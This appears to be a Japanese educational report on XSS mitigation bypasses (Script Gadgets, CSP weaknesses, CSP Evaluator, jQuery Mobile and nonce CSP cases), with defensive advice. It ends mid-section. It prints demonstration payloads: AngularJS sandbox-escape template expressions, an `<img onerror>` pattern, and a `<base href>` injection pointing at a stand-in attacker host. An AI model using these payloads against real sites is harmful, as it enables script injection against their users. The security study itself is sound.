このマークアップ自体には`<script>`もインラインイベントハンドラの直接記述もなく、CSPの`script-src`にも、サニタイザの「危険タグの除去」にも引っかからないように見える。しかしページ上でjQuery Mobileの初期化コードが走ると、そのライブラリが`data-role="popup"`を持つ要素を自動的に検出し、`data-content`の値を**信頼して**`.html()`（内部的には`innerHTML`と同等）に渡して描画する。この結果、`data-content`内の`<img src=x onerror=...>`がDOM上に実体化され、`onerror`イベントハンドラとして攻撃者のJavaScriptが実行される。

- **なぜ動くか**: サニタイザやCSPは「注入されたタグそのもの」しか見ていないが、ライブラリの初期化コードは**属性の値を後からHTMLとして再解釈（パーサ再解釈）してDOMに書き戻す**。この「一度は無害な形で通過したデータが、後段の正規コードによって危険なsinkに渡される」という時間差・経路の分離が、静的フィルタリングの検出網をすり抜ける根本原因である。

もう一つの典型パターンは、AngularJS（1.x系、当時のsandbox機構がまだ存在した/その後撤廃された時期）における**テンプレートインジェクション系gadget**である。AngularJSは`ng-`から始まる属性やdouble-mustache構文（`{{ }}`）をテンプレートとして評価するため、攻撃者が`ng-app`や`ng-csp`が有効なページに対して、以下のような属性だけを注入できれば、AngularJSの式評価エンジンを経由してコード実行に到達できる場合があった。

```html
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

- **なぜ動くか**: AngularJSのテンプレートエンジンは`{{ }}`内の文字列をJavaScript式として評価する。`constructor.constructor('alert(1)')()`は、任意のオブジェクトの`constructor`プロパティ（プロトタイプチェーンを辿って到達する`Function`コンストラクタ）を取得し、それを使って動的に新しい関数を生成・実行する**サンドボックス脱出（sandbox escape）**の定石パターンである。`<script>`タグを一切使わずに、AngularJS自身の式評価器（eval相当の機能）を「借用」して任意コードを実行させている点が、まさにScript Gadgetの本質を示している。

これらの例が示す共通原理は次の通りである。

1. **sink（危険な処理の最終到達点。例: `innerHTML`, `eval`, `Function`コンストラクタ, jQueryの`.html()`）そのものは、攻撃者が直接注入したコードから呼ばれるのではなく、ページに元から存在する正規のライブラリコードの内部から呼ばれる。**
2. 攻撃者が制御できるのは、そのライブラリが「設定・データ」として信頼して読み取る**属性値やテキストコンテンツ**のみ。
3. サニタイザ・CSP・WAFは「タグ名/属性名/URLスキーム」という**構文レベル**でしか判定できないため、「その属性がどのライブラリにどう解釈されるか」という**意味レベル**の危険性までは把握できない。この構文と意味のギャップこそがScript Gadgetsが成立する原理である。

#### 2.4 影響範囲と結論

論文は、CSP・サニタイザ・WAFのいずれも単独では「防御しきれない」ことを示し、次のような結論・提言を行った。

- 大手企業サイトを含む実運用サイトの多くで、CSPを導入していても信頼するホスト（CDN等）にScript Gadgetsを含むライブラリが配置されており、**理論上バイパス可能な状態**にあった。
- 対策として、CSPは**nonceベース／hashベースのstrict-dynamic方式**（許可リスト方式ではなく、サーバが発行した使い捨てトークンで個々の`<script>`要素を認可する方式）へ移行すべきであると提言した。これはホスト許可リスト自体を廃止し、「そのホストにgadgetがあるかどうか」という問題設定自体を無効化するアプローチである。
- サニタイザについては、**属性・タグの許可リストを最小限にし、DOM操作系ライブラリが読む可能性のある`data-*`属性やaria属性等も含めて慎重に扱う**必要性が指摘された。
- 根本的な教訓として、「信頼されたライブラリ（trusted code）」という概念そのものが、DOM入力に対しては相対的でしかなく、**ライブラリの実装詳細まで踏み込んだ脅威分析なしにCSPやサニタイザだけで『安全』と判断してはならない**という考え方が業界に広まった。

> 出典: Don't Trust The DOM: Bypassing XSS Mitigations Via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

### 3. Google CSP Evaluator

#### 3.1 ツールの位置づけ

**CSP Evaluator**（https://csp-evaluator.withgoogle.com/）は、Googleが公開している無料のWebツール・ライブラリで、URLを入力するかCSPポリシー文字列を直接貼り付けると、そのポリシーに含まれる**構文的・意味的な弱点**を自動的に検出し、重大度（高・中・情報）付きで一覧表示してくれる。CSPをレビューする際の「静的解析器」として、Bug Bountyやセキュリティ診断の現場でも広く使われている。

> ⚠️ **未取得の資料に関する補足**: `csp-evaluator.withgoogle.com`自体も本環境のegressプロキシによりブロックされ、直接の内容取得はできませんでした。以下のURLからユーザーご自身で直接ご覧いただき、実際に自社のCSPを貼り付けて挙動を確認することを推奨します: https://csp-evaluator.withgoogle.com/
> （以下は未取得資料の補足として、一般に公開されている情報・検索結果・一般知識に基づく解説です。）

#### 3.2 検出する主な問題カテゴリ（原理レベルの説明）

CSP Evaluatorが指摘する代表的な弱点は、いずれも「**許可リストという発想そのものの限界**」に起因する。

**(1) `unsafe-inline`の使用**

```
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

`unsafe-inline`が指定されると、ページ上のあらゆるインラインスクリプト・インラインイベントハンドラが実行可能になる。これは攻撃者が注入したインラインスクリプトも区別なく許可してしまうため、**CSPが本来防ぎたい素朴なXSSすら防げなくなる**。CSP Evaluatorはこれを最高重要度で警告する。

- **なぜ危険か（原理）**: CSPのソース許可は「スクリプトがどこから来たか」を判定基準にしているが、`unsafe-inline`はこの判定機構自体を無効化するキーワードである。ブラウザは`unsafe-inline`が指定されたポリシーでは、インラインスクリプトに対して送信元チェックを一切行わない。

**(2) 広すぎるホスト許可リスト（wildcardや大手CDN全体の許可）**

```
Content-Security-Policy: script-src 'self' https://*.googleapis.com https://*.cloudflare.com;
```

ワイルドカード（`*`）や、大規模で多目的なCDNドメイン全体を許可すると、そのドメイン配下でホストされている**無数のJavaScriptファイルのどれか一つでもJSONPエンドポイントやオープンリダイレクト、あるいは前章までで学んだScript Gadgetsを含んでいれば**、攻撃者はそのURLを`<script src="...">`として読み込ませることでCSPをバイパスできる。CSP Evaluatorは、既知のJSONPエンドポイントやgadgetを含むことが報告されているドメイン（AngularJSやjQueryなど、Script Gadgets研究で指摘されたライブラリを配信しているCDN等）を許可リストに含めている場合、具体的にそのドメインを名指しして警告する仕組みを持つ。

- **なぜ危険か（原理）**: CSPの「送信元（オリジン）ベースの許可」は、「そのオリジンにあるファイルはすべて等しく信頼できる」という強い前提の上に成り立っている。しかし実際には、同一オリジン上にJSONPエンドポイント（クエリパラメータの値をそのままJavaScriptとして返すAPI）や、前節で述べたScript Gadgetsを含むライブラリが同居していることが多く、**オリジン単位の粒度では「安全なファイル」と「危険なファイルの入口」を区別できない**。これがCSPの構造的弱点であり、CSP Evaluatorが最も重視する検査観点である。

**(3) `base-uri`の未設定・過剰許可**

```
Content-Security-Policy: script-src 'self';
<!-- base-uri が未指定 -->
```

`<base href="...">`タグはページ内の相対URL解決の基準を変更する。`base-uri`ディレクティブが指定されていない、あるいは`*`のように緩い場合、攻撃者がHTMLインジェクションによって`<base href="https://attacker.example/">`を挿入できれば、ページ内のすべての相対パス指定のスクリプト読み込み（`<script src="/app.js">`など）が**攻撃者のサーバから読み込まれるように書き換わる**。CSPの`script-src`が`'self'`のみを許可していても、`self`が指す実体自体を`<base>`タグで攻撃者ドメインにすり替えられてしまえば意味がなくなる。

- **なぜ危険か（原理）**: ブラウザは相対URLを解決する際、`document.baseURI`（`<base>`タグによって変更可能）を基準にする。CSPの`script-src 'self'`は「現在のオリジンから読み込まれたスクリプト」を許可するチェックだが、その「現在のオリジン」の解釈基準そのものが`<base>`タグで書き換え可能であるため、**チェックの前提条件自体が攻撃者に操作されてしまう**。CSP Evaluatorはこのため`base-uri 'none'`または`base-uri 'self'`の明示的な設定を強く推奨する。

**(4) `object-src`の未設定**

Flashなど、プラグイン（`<object>`, `<embed>`）経由でのコード実行を防ぐため、`object-src 'none'`の明示も併せてチェックされる。Flashは現在ほぼ廃止されているが、レガシー環境向けの防御として引き続き評価項目に含まれる。

**(5) strict-dynamicとnonce/hashベースの推奨**

CSP Evaluatorは、上記のような許可リスト方式に起因する問題を回避する解決策として、**`'strict-dynamic'`とnonceまたはhashを組み合わせた「Strict CSP」**を推奨する。

```
Content-Security-Policy: script-src 'nonce-<ランダム値>' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

- **なぜ有効か（原理）**: `'strict-dynamic'`が指定されると、ブラウザは**ホスト許可リストを完全に無視**し、代わりに「ページ内で信頼された（nonceまたはhashが一致した）スクリプトによって動的に生成・挿入されたスクリプトは、その出自を継承して信頼する」という**伝播ベースの信頼モデル**に切り替える。これにより、「どのホストを許可リストに入れるべきか」という、Script Gadgets研究が突いた根本的な弱点（ホスト単位では安全性を判定できない）そのものを解消できる。逆に言えば、ホスト許可リスト方式のCSPを使い続ける限り、Script Gadgetsによるバイパスの理論的リスクは残り続ける、というのがこのツールとBlack Hat論文に共通するメッセージである。

#### 3.3 実務上の使い方まとめ

1. 本番導入前のCSPポリシーをCSP Evaluatorに貼り付け、高重要度（赤色）の指摘（`unsafe-inline`、広すぎるワイルドカード、`base-uri`未設定など）を必ず解消する。
2. 許可リストにCDNやサードパーティドメインを追加する際は、そのドメインが**JSONPエンドポイントやScript Gadgetsを含むことが知られていないか**を必ず確認する（CSP Evaluatorや各種CSPバイパス集の突合が有効）。
3. 可能であれば早期に**nonceベースのstrict-dynamic方式**へ移行し、ホスト許可リスト方式そのものから脱却することを目指す。

> 出典: CSP Evaluator — https://csp-evaluator.withgoogle.com/

### 4. まとめ：この章の核心

Script GadgetsとCSP Evaluatorの関係を一言でまとめると、次のようになる。

- **Script Gadgets研究**は、「CSPやサニタイザは構文（タグ・属性・URLスキーム）しか見ておらず、ページ上の正規JavaScriptが持つ『意味』までは検証できない」という**構造的な限界**を実証した。
- **CSP Evaluator**は、その限界の中でも「せめて機械的に検出できる危険パターン（`unsafe-inline`、広すぎる許可リスト、`base-uri`の欠落など）」を洗い出し、より堅牢な**nonce/strict-dynamic方式**への移行を促す実務ツールである。

この章で学ぶべき最重要ポイントは、**「CSPを設定した」「サニタイザを通した」という事実だけでは、Webページ上に存在する正規コードの挙動まで保証されない**という点である。次章以降では、この考え方をさらに発展させ、具体的なDOM Clobberingやミューテーションベースのサニタイザバイパスなど、より高度な「信頼された正規コードの誤用」パターンを扱っていく。

---

## コード再利用攻撃（CCS17論文 / Google PoC）

これまでの章では「攻撃者が任意のJavaScriptコードをページに注入できるかどうか」を中心に議論してきた。しかし、CSP（Content Security Policy: ブラウザに「このサイトではどこから来たスクリプトを実行してよいか」を宣言するHTTPレスポンスヘッダ）の`strict-dynamic`や、`unsafe-eval`を禁止した厳格な設定、あるいはDOMベースの入力サニタイズ（sanitization: 危険な文字列を無害化する処理）が正しく実装されていても、なお実行可能なコードへとつながる攻撃経路が存在する。それが本節で扱う**コード再利用攻撃（Code-Reuse Attacks for the Web）**、通称**Script Gadgets（スクリプト・ガジェット）攻撃**である。

この攻撃はメモリ破壊系の脆弱性で古くから知られる「ROP（Return-Oriented Programming: 攻撃者が新しいコードを注入する代わりに、プログラム内に既に存在する命令断片＝ガジェットをつなぎ合わせて任意の処理を実現する手法）」の発想をWebアプリケーションに輸入したものである。攻撃者は自分で新しい`<script>`タグや`eval()`呼び出しを書き込む必要がない。ページに既にロードされている正規のJavaScriptライブラリ（jQuery、Angular、Vue、各種UIフレームワークなど）の中に潜む「無害に見えるコード片＝ガジェット」を、DOM属性への文字列注入だけで起動し、最終的に任意コード実行へとつなげる。

### 1. なぜCSPやサニタイザだけでは防げないのか（仕組みの核心）

XSS対策の多くは「スクリプトとして解釈される構文（`<script>`タグ、`on*`イベントハンドラ属性、`javascript:`URIなど）が注入されること」を防ぐ、あるいは「注入元のオリジンを制限する」ことに主眼を置く。

- CSPの`script-src 'strict-dynamic'`は、「信頼されたスクリプトが動的に生成した`<script>`要素は、たとえnonceやhashを持たなくても実行を許可する」というルールである。これは「動的に読み込まれるスクリプトを許可リストで管理するのが現実的に困難」という問題に対処するための緩和策だが、裏を返せば「信頼されたスクリプトが、攻撃者の入力を使って新しい`<script>`要素やイベントハンドラを組み立ててしまえば、それはそのまま実行される」という前提に立っている。
- サニタイザ（DOMPurifyなど）はHTML/属性の**構文レベル**での危険性を判定する。しかし「一見ただのテキスト値やCSSクラス名」に見える文字列が、後続のJavaScriptコード（ガジェット）によって`eval`や`innerHTML`やDOM API呼び出しの引数として再解釈されるケースまでは検出できない。

つまりCode-Reuse Attackの本質は、**「攻撃者が注入した時点では無害なデータ」が「アプリケーション内の別の正規コード（ガジェット）によって、実行可能なコンテキストへ変換される」**という多段の「データフロー」を突く点にある。CSPは「誰のスクリプトが動くか」は制御できても、「そのスクリプトが自分自身のロジックとして何を実行するか」までは制御できない。これがWebにおけるROPが成立する根本原理である。

### 2. Script Gadgetsとは何か（定義と分類）

**Script Gadget（スクリプト・ガジェット）**とは、次の性質を持つ既存コード片を指す。

1. アプリケーションに正規に組み込まれている（ライブラリのコード、あるいはアプリ自身のコード）。
2. DOM上の何らかの属性・データ値・URLフラグメントなど、攻撃者が（間接的にでも）書き込める場所を読み取る。
3. 読み取った値を、最終的に`eval`系API、`innerHTML`、`<script>`要素の生成、イベントハンドラ登録など、コードとして実行されうる**sink（入力が最終的に実行・解釈される危険な代入先）**へ渡してしまう。

典型的なガジェットのパターンには次のようなものがある。

- **カスタムデータ属性駆動型**: `data-*`属性の値をライブラリが読み取り、それをテンプレートとして評価する。
- **イベント委譲（イベントデリゲーション）型**: 要素の`class`名やその他の属性をもとにハンドラを動的にバインドする仕組みが、攻撃者の指定したクラス名文字列を経由してコードとして解釈される。
- **テンプレートエンジン型**: `{{ }}`のようなテンプレート構文をクライアント側でその都度評価するライブラリ（Angular 1.x系のテンプレートインジェクションが有名）。
- **ルーティング/ハッシュ駆動型**: URLの`#`以降の値を読んで、それを元にDOM操作やコード実行を行う。

これらは単体では「機能」であって「脆弱性」ではない。しかし、CSPで`<script>`タグの直接注入や`unsafe-inline`が塞がれている状況で、攻撃者が唯一書き込める場所（例えば掲示板の投稿本文がある要素の`class`属性やDOMプロパティに反映される、といったマイナーなXSSシンク）がこれらガジェットの「入力」と一致した瞬間、CSPを迂回した任意コード実行が成立する。

### 3. 攻撃の具体例（原理の理解のためのモデルケース）

以下は、実際のCCS17論文やGoogleのPoCで示された考え方をベースに、原理を理解するための簡略化した例である（厳密な実コードはリポジトリ内の各フレームワーク別PoCを参照されたい）。

```html
<!-- CSPヘッダ例: strict-dynamic を用いた「モダンな」設定 -->
<!-- Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abc123' -->

<!-- 攻撃者が注入できるのは class 属性の値だけ、というシナリオ -->
<div id="userProfile" class="ATTACKER_CONTROLLED_VALUE">こんにちは</div>

<script nonce="abc123" src="https://cdn.example.com/some-ui-framework.js"></script>
```

ここで、`some-ui-framework.js`（正規の、nonceで許可された信頼済みスクリプト）が、ページ内の要素に対して次のような処理を行っていたとする。

```javascript
// フレームワーク側の「機能」コード（正規、攻撃者は書き換えられない）
document.querySelectorAll('[class]').forEach(el => {
  // class 属性の値を「テンプレート」として扱い、DOM操作の設定値として利用する仕様
  const config = el.className;
  if (config.startsWith('tmpl:')) {
    el.innerHTML = renderTemplate(config.slice(5)); // ← ここがsink
  }
});
```

攻撃者が`class`属性に書き込める値が「tmpl:」から始まりさえすれば、`renderTemplate()`の実装次第で、この関数の中でさらにHTML文字列が`innerHTML`に渡される。もし`renderTemplate`が内部でテンプレート式を評価する（例えば`{{...}}`をJavaScriptとして`eval`する）実装になっていれば、攻撃者は

```
class="tmpl:{{constructor.constructor('alert(document.domain)')()}}"
```

のような値を注入するだけで、CSPが禁止しているはずの任意コード実行に到達できる。

**なぜ動くか**: この例でCSPは「新しい`<script>`タグや`unsafe-inline`によるインラインスクリプトの実行」だけを制限しており、「nonceで許可された正規スクリプト自身が、DOM上のテキスト値をテンプレート/コードとして再解釈する」処理は制限対象外である。攻撃者は新しいスクリプトを書き込んでいない。既存の、CSPに許可された正規スクリプトの「機能」をリモコン操作しているに過ぎない。ROPで攻撃者が新規の実行可能コードをメモリに書き込まず、既存の命令列を「呼び出す順序」だけで制御するのと同じ構造である。

`constructor.constructor('...')()`という書き方が使われる理由にも触れておく。多くのテンプレートエンジンや「安全なeval代替」実装は、直接の`eval`呼び出しやグローバルの`Function`コンストラクタへの参照を禁止・サンドボックス化している。しかし、JavaScriptでは任意のオブジェクトから`obj.constructor`（そのオブジェクトを生成したクラス）を辿り、さらにその`.constructor`（つまり`Function`コンストラクタ自身）を取得できてしまう。これは**プロトタイプチェーン（JavaScriptオブジェクトが自身にないプロパティ参照時に、生成元のクラス・親クラスを順に辿っていく仕組み）**の性質を悪用したサンドボックス脱出テクニックであり、`Function`コンストラクタを直接名指しできない制限下でも、任意の文字列をコードとして実行する経路を確保できてしまう。

### 4. 影響範囲：なぜ「主流フレームワーク全般」が対象になったのか

CCS17論文とGoogleの研究チームが実証した最大のポイントは、この種のガジェットが特定の1つのライブラリのバグではなく、**多くの主流JavaScriptフレームワークに構造的に存在する**という点である。UIフレームワークやテンプレートエンジンは「便利さ」のために、DOM属性やデータ値を柔軟に解釈する機能を数多く備えている。柔軟な解釈こそがガジェットの温床になる。したがって、

- CSPを`strict-dynamic`や厳格なホワイトリストで固めていても、
- サーバー側でHTMLエスケープを完全に行っていても、
- クライアント側のテイント追跡（taint tracking: 「信頼できない入力がどこまで伝播したか」を追跡する解析手法）で入力から直接の危険なsinkまでの単純な経路を塞いでいても、

「アプリが読み込んでいる正規ライブラリの挙動」そのものが攻撃の踏み台になるため、これらの対策だけでは防げない。特にテイント追跡ベースの防御は、データフローがクライアント側で完結する場合しか捉えられず、サーバーとクライアントをまたぐ「ハイブリッドなデータフロー」（例: サーバー側で一度保存された値が、後で別ページの別のJSコードに読み込まれてガジェット化される、といった経路）には無力である。

### 5. 防御策

コード再利用攻撃に対する防御は、単一の銀の弾丸ではなく多層的な対策の組み合わせが必要になる。

- **信頼するライブラリを最小限にし、バージョンを固定・監査する**: 使用しているフレームワーク自体に既知のガジェットが存在しないか、CVEやセキュリティアドバイザリを確認する。
- **属性・データ値のホワイトリスト化**: `data-*`属性やクラス名など、ユーザー入力が反映されうる場所には、意味のある値のみを許可するスキーマ検証を導入する（自由形式の文字列を許可しない）。
- **テンプレートエンジンの安全モードを使う**: Angular 1.x系であれば`$sce`（Strict Contextual Escaping）を有効にし、任意のテンプレート式評価を許可しない設定にする。動的なテンプレートコンパイルを避け、可能であれば事前コンパイル（ビルド時テンプレートコンパイル）を使う。
- **CSPを唯一の防波堤にしない**: CSPは「新規スクリプトの持ち込み」を防ぐものであり、「既存スクリプトの誤用」までは防げないという限界を前提に、入力バリデーションとサニタイズを併用する。
- **DOM APIの安全な利用**: `innerHTML`ではなく`textContent`を使う、テンプレートに渡す前に厳格なスキーマでの型検証を行うなど、sink自体を安全なAPIに置き換える。

### 6. 資料1: CCS17論文「Code-Reuse Attacks for the Web」

> ⚠️ **未取得の資料**: 「Code-Reuse Attacks for the Web（CCS17論文PDF）」は自動取得できませんでした（理由: 本セッションのegressプロキシにより`acmccs.github.io`および代替ミラー`poseidon.ias.tu-bs.de`へのアクセスがブロックされたため）。以下のURLからユーザーご自身で直接ご覧ください: https://acmccs.github.io/papers/p1709-lekiesA.pdf

（以下は未取得資料の補足として一般知識およびWeb検索で得られた公開情報に基づく解説です）

この論文はSebastian Lekies、Krzysztof Kotowicz（Google）、Samuel Groß、Martin Johns（SAP SE）らにより執筆され、ACM CCS 2017（2017年10月末〜11月、米国ダラスにて開催）で発表された。論文タイトルは正式には「Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets」であり、その名の通り「Script Gadgets（スクリプト・ガジェット）」という概念を初めて体系的に定義し、学術的に評価した研究である。

論文の核心的な主張は次の通りである。

- 従来のXSS対策（HTMLサニタイザ、Web Application Firewall、CSP）は、「攻撃者が注入したペイロードそのものが直接実行可能なコードであること」を前提に設計されている。
- しかし実際の攻撃では、注入されたコンテンツは一見「ただのデータ」であり、既存の防御機構にはスキャンされても引っかからない。
- そのデータが、アプリケーション内に既に存在する正規のJavaScriptコード（Script Gadget）によって、Webアプリケーションのライフサイクルの中で徐々に「実行可能なコード」へと変換されていく。
- この攻撃はクライアント側とサーバー側にまたがる「ハイブリッドなデータフロー」を持つことが多く、クライアント側のみを追跡するテイント解析による防御では検出も防御もできない。
- 実証実験として、複数の主流JavaScriptフレームワーク・ライブラリに対してガジェットを発見し、CSPの`strict-dynamic`や`unsafe-eval`禁止設定を回避できることを示した。

この研究はAppSec EU 2017やBlack Hat USA 2017でも発表されており、業界に大きな影響を与えた。CSP策定コミュニティやフレームワーク開発者に対し、「柔軟な属性解釈機能を持つライブラリは、たとえコード注入の脆弱性がなくても、他の場所での小さな入力反映（マイナーXSS）と組み合わさることで危険なガジェットになりうる」という警鐘を鳴らした点が最大の功績である。

> 出典: Code-reuse attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets — https://acmccs.github.io/papers/p1709-lekiesA.pdf （参考: https://research.google/pubs/pub46450/ 、 https://dl.acm.org/doi/10.1145/3133956.3134091 ）

### 7. 資料2: Google `security-research-pocs` リポジトリ（script-gadgets）

このリポジトリはGoogle Security Researchチームが公開した、CCS17論文の実証コード（Proof of Concept）集である。研究者はSamuel GroßおよびMartin Johnsを含むチームであり、AppSec EU 2017・Black Hat USA 2017での発表に対応する実動デモコードが収められている。なお本リポジトリは2023年1月10日にアーカイブ化され、現在は読み取り専用（メンテナンス終了）となっている。

リポジトリの構成は、フレームワーク／防御機構ごとにディレクトリが分かれている点が特徴である。

- `csp/sd/` — CSPの`strict-dynamic`設定を回避するPoC群
- `csp/ue/aurelia_exploit.php` — Aureliaフレームワークを用いた`unsafe-eval`禁止環境での回避例
- Dojo、その他複数の主要UIライブラリ向けのexploitファイル（各`*-exploit.*`ファイル）

各PoCを動作させるための前提環境として、Apache2 + mod_phpによるHTTP(S)サーバー、TLS証明書、`victim.example.com`と`attacker.example.com`のような仮想ホスト構成が用意されている。これは実際の被害者サイト・攻撃者サイトという2オリジン構成を模し、クロスオリジンでの攻撃シナリオ（例えば攻撃者サイトが被害者サイトへ悪性な値を送り込み、被害者サイトのライブラリがそれをガジェットとして処理する）を再現するためのものである。

このリポジトリが示す最も重要な結論は、**「最新のXSS緩和技術（CSPのstrict-dynamicやunsafe-eval禁止など）を導入していても、アプリケーションが利用する既存の正規JavaScriptコードの中に、任意コード実行へつながるガジェットが実在し、複数の主流フレームワークに共通して見つかる」**という点である。これは単一のライブラリのバグ修正では解決せず、CSPというアーキテクチャレベルの防御思想そのものに構造的な限界があることを実証した点で意義が大きい。

> 出典: google/security-research-pocs（script-gadgets） — https://github.com/google/security-research-pocs/tree/master/script-gadgets

### 8. まとめ

コード再利用攻撃（Script Gadgets）は、「攻撃者が新しい実行可能コードを注入する」という従来のXSSの前提を覆し、「アプリケーションが既に信頼している正規コードの機能を、想定外の入力で誤作動させる」という新しい攻撃モデルを提示した。この仕組みを理解する上で重要なのは、CSPが防いでいるのは「誰のコードが実行されるか（出所の制御）」であり、「そのコードが何をするか（挙動の制御）」までは保証しないという点である。防御側は、CSPやサニタイザといった単一の対策に依存せず、DOM属性やデータ値に対する厳格な入力検証、テンプレートエンジンの安全モード活用、そして利用ライブラリ自体の継続的な監査という多層防御の発想を持つ必要がある。

---

## CSPバイパス実例（Truesec / PortSwigger nonce）

CSP（Content Security Policy／コンテンツセキュリティポリシー。ブラウザに「このオリジンのスクリプトだけ実行してよい」といった許可リストを伝えるHTTPレスポンスヘッダ）は、反射型・格納型XSSに対する強力な多層防御として広く導入されている。しかし「CSPを設定した＝XSS不可能」ではない。本節では、CSPの理論的な穴ではなく、**実運用で実際に破られた2つの具体的な実例**を通じて、なぜ堅牢に見えるCSPが陥落するのかを仕組みレベルで理解する。

キーワードは「**script gadget（スクリプトガジェット）**」と「**nonce漏洩**」である。どちらも、CSP自体のロジックにバグがあるわけではなく、「CSPが許可した正規のコードを、攻撃者が意図しない用途に流用する」という共通の構造を持つ。

### 4-L-1 script gadget型バイパス：jQuery Mobileの実例（Truesec）

#### script gadgetとは何か

まず用語を定義する。**script gadget**とは、「攻撃者が直接スクリプトを注入しなくても、ページ上に既に読み込まれている“正規の”JavaScriptコードを、DOM構造やHTML属性の細工だけで“悪用可能な形”に誘導し、結果的に任意コード実行に持ち込む部品」を指す。

CSPの`script-src`は「どのスクリプトを実行してよいか」を制御するが、あくまで**スクリプトの出所（origin／nonce／hash）**を見ているだけであり、「そのスクリプトが内部で何をするか」までは検査しない。攻撃者がHTMLインジェクション（`<script>`タグやインラインイベントハンドラを使わない、単なるDOM構造の注入。CSPの直接の対象にならない）しかできない状況でも、既にCSPで許可されているライブラリ（jQuery、jQuery Mobile、AngularJS、Vue.jsなど）が「特定のHTML属性や構造を見つけると自動的にコードを実行する」という機能を持っていれば、それを**踏み台（gadget）**として使い、CSPには一切違反せずにスクリプト実行まで到達できる。

この概念を体系的に整理し広めたのはSebastian Lekiesらの研究（Google, 2017年 Black Hat/AppSec EU発表）だが、Truesecのブログはこの考え方を、より実践的に**jQuery Mobileという実在のライブラリの脆弱な挙動**に当てはめて解説している点に価値がある。

#### 前提条件

この攻撃が成立するための前提は次の通りである。

- サイトのCSPが`script-src`にjQuery Mobile本体（あるいはそれをホストするCDN）を許可している。
- 攻撃者が使えるのは**HTMLインジェクション**（例えば`innerHTML`へのユーザー入力代入や、サニタイザ通過後のDOM構造操作）のみで、`<script>`タグの直接注入・インラインイベントハンドラ・`javascript:`スキームはCSPやサニタイザによって阻止されている。

#### 仕組み

jQuery Mobileは、ページ内に挿入されたDOM要素を**自動的に「拡張（enhance）」する**設計になっている。具体的には、`data-role`をはじめとする`data-*`属性を持つ要素をライブラリが定期的・イベント駆動的に走査し、その属性値に応じて対応するウィジェットのロジック（ポップアップ表示、ページ遷移、コラプシブルパネルの開閉など）を**自動実行**する。この「属性を見て自動的に処理を行う」仕組み自体はCSP登場以前から存在する便利機能だが、CSP時代においては次のような危険な構造になる。

- 攻撃者は`<script>`を注入できなくても、`data-role="popup"`や`data-transition`といった**属性つきのDOM要素をHTMLインジェクションで挿入**できれば十分。
- jQuery Mobile側のウィジェット処理コードが、その属性値やリンク先（`href="#id"`によるDOM内フラグメント参照）を**信頼できる設定値として無検証で処理**してしまう経路がある場合、属性値の内容によっては最終的にDOM操作や既存コードパスの誤用を通じて、攻撃者が意図した副作用（別要素の内容やイベントハンドラの実行につながる状態）を引き起こせる。
- 重要なのは、**このとき実行されているスクリプトはすべて「CSPで許可済みのjQuery Mobile本体」自身**であり、CSPのポリシー評価上は一切違反していないという点である。CSPは「誰が書いたコードか」でしか許可を判定できず、「そのコードが今まさに攻撃者に悪用されているか」は判定できない。これがscript gadget型バイパスの本質的な原理である。

```html
<!-- 攻撃者がHTMLインジェクションで挿入できるのは <script> を含まない
     「一見無害な」data-*属性つきのマークアップのみ -->
<div data-role="popup" id="p1" data-transition="flip">
  ...attacker-controlled markup...
</div>
<a href="#p1" data-rel="popup">click</a>
```
> なぜ動くか: `<script>`もインラインハンドラも存在しないため、CSPの`script-src`・`unsafe-inline`禁止のいずれにも抵触しない。しかしCSPで許可済みのjQuery Mobile本体が、この属性つき構造をページロード後に自動走査・自動実行する設計になっているため、DOM構造の注入だけでライブラリの内部ロジックを起動できてしまう。

#### 影響とバージョン

Truesecの記事、および元となったLekiesらの研究では、**jQuery Mobile 1.4.5**（同ライブラリの事実上最後の安定版。2014年10月リリース）が、CSP・XSSフィルタ・DOMPurifyなど複数のミティゲーションを同時にすり抜けられる代表的な脆弱ライブラリとして繰り返し引用されている。jQuery Mobileは2021年に事実上の開発終了（メンテナンス終了）となっており、今後修正パッチが提供される見込みはない。したがって**「許可リストに古いUIライブラリが乗っている」こと自体がCSPの実効性を無効化しうる**、という教訓が重要になる。

#### 防御

- CSPの`script-src`に**バージョンを固定した信頼できるスクリプトのみ**を列挙し、jQuery Mobileのような「DOM走査による自動実行」を行う汎用UIライブラリを許可リストに含める場合は、既知のgadgetがないか個別に検証する。
- サニタイザ（DOMPurify等）は`<script>`やイベントハンドラ属性の除去だけでなく、**サイトで使用中のライブラリが解釈する独自の`data-*`属性・構造**も踏まえて設計する。
- 最終的な防御としては、DOM sink（入力が最終的に実行・解釈される危険な代入先。例：`innerHTML`）へのユーザー入力到達そのものを断つのが最も確実であり、CSPはあくまで多層防御の一枚として扱う。

> 出典: Bypassing modern XSS mitigations with code-reuse attacks — https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks
（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約と、関連する一次研究であるSebastian Lekies et al., "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets"（Black Hat USA / AppSec EU, 2017）、および Google製の実証コード集 `google/security-research-pocs`（script-gadgets/bypasses.md）の情報を踏まえて構成した。）

---

### 4-L-2 nonceベースCSPが「自社サイトで」破られた実例（PortSwigger Research）

#### nonceベースCSPの位置づけ

`script-src`をホスト名の許可リスト（allowlist）で書く方式は、許可ドメイン上にJSONPエンドポイントやオープンリダイレクトなど**「間借りできるスクリプト」**が1つでもあればバイパスされやすいことが知られている。そこで近年推奨されているのが**nonce（ノンス。リクエストごとにサーバーが生成するランダムな一回限りのトークン）ベースのCSP**である。

```
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

`<script nonce="r4nd0m123">...</script>`のように、レスポンス発行時に埋め込まれた正しいnonce値を持つ`<script>`だけが実行を許される。攻撃者はHTMLインジェクションができても、**レスポンスごとに変わる正しいnonce値を知らない限り**自分のスクリプトタグに正しいnonceを付けられないため、原理的にXSSを実行に持ち込めない――というのが設計上の期待である。

